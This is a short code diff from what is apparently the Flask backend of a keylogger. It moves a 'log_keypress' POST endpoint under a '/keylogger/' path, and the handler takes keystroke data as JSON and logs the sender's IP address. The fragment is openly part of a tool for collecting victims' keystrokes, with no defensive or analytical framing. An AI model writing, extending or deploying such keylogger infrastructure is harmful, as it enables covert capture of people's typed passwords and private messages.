@@ -3,7 +3,7 @@ import datetime
 
 app = Flask(__name__)
 
-@app.route('/_api_/', methods=['POST'])
+@app.route('/keylogger/_api_/', methods=['POST'])
 def log_keypress():
     data = request.get_json()
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
